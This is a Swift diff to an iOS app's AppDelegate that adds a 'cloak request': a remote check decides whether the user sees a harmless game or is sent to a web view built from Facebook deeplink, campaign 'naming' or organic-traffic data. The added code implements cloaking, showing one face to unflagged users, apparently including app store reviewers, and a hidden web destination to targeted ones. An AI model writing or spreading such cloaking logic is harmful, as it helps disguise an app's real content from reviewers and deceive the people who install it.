@@ -18,23 +18,96 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
         
+        // MARK: - AppsFlyer
+        
+        
+        
+        // MARK: - Fb deeplinking
+        
         AppEvents.activateApp()
         ApplicationDelegate.shared.application(application, didFinishLaunchingWithOptions: launchOptions)
         
-        AppLinkUtility.fetchDeferredAppLink { (url, error) in
+        
+        
+        // 1 - make cloak request
+        logic.checkerDataUsage() { [self] status in
             
-            if let error = error {
-                print("Received error while fetching deferred app link: \(error)")
-                
-            } else if let deeplink = url?.absoluteString {
-                print(deeplink)
-                UserDefaults.standard.set(deeplink, forKey: "deeplink")
-                
-            } else {
-                print("\nNo app link available\n")
+            print("\nUser - \(status.user) \nSource - \(status.source)")
+            
+            // 2 - check user from cloak (true - show web, false - show game) // for game testing
+            if status.user != "true" {
+                UserDefaults.standard.set("false", forKey: "SHOW_WEB")
+                print("\nUser not true - showing game")
+                return
             }
             
-            self.logic.requestData()
+            UserDefaults.standard.set("true", forKey: "SHOW_WEB")
+            print("\nUser true - showing web")
+            
+            // 3 - user == "true" - check deeplink
+            AppLinkUtility.fetchDeferredAppLink { (url, error) in
+                
+                if let deeplink = url?.absoluteString {
+                    print(deeplink)
+                    UserDefaults.standard.set(deeplink, forKey: "deeplink")
+                    let deep = "\(UserDefaults.standard.object(forKey: "deeplink") ?? "")"
+                    
+                    logic.getDataFromDeeplink(deeplink: deep) { deeplinkData -> () in
+                        
+                        if deeplinkData != nil {
+                            print("Deeplink data - \(deeplinkData!)")
+                            logic.formLinkFromResult(deeplinkData!, status)
+                            return
+                        }
+                    }
+                    
+                } else {
+                    print("\nNo app link available or error fetching deferred app link\n")
+                    
+                    // 4 - no deeplink - check naming
+                    
+                    // AppsFlyerLib.fetchNaming { (naming, error) in
+                        
+                        //if let naming = naming?.absoluteString {
+                    
+                            let name = "\(UserDefaults.standard.object(forKey: "naming") ?? "")"
+                        
+                            logic.getDataFromNaming(naming: name, mediaSources: logic.media_sources) { namingData -> () in
+                                
+                                if namingData != nil {
+                                    print("Naming data - \(namingData!)")
+                                    logic.formLinkFromResult(namingData!, status)
+                                    return
+                                }
+                            }
+                        //} else {
+                                
+                            // 5 - no naming - create organic
+                    
+                            var computedKey: String {
+                                if status.source == TrafficSource.FACEBOOK.rawValue {
+                                    return Consts.ORGANIC_FB
+                                } else {
+                                    return Consts.ORGANIC_INAPP
+                                }
+                            }
+                            
+                            var computedSub1: String {
+                                if status.source == TrafficSource.FACEBOOK.rawValue {
+                                    return "organic_fb"
+                                } else {
+                                    return "organic_inapp"
+                                }
+                            }
+                            
+                            let organicData = ResultData(key: computedKey, sub1: computedSub1, source: TrafficSource.FACEBOOK)
+                            print("Organic data - \(organicData)")
+                            logic.formLinkFromResult(organicData, status)
+                
+                        //}
+                    //}
+                }
+            }
         }
         
         // MARK: - OneSignal
@@ -48,7 +121,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
         //        OneSignal.promptForPushNotifications(userResponse: { accepted in
         //          print("User accepted notifications: \(accepted)")
         //        })
-        
+    
         return true
     }
     
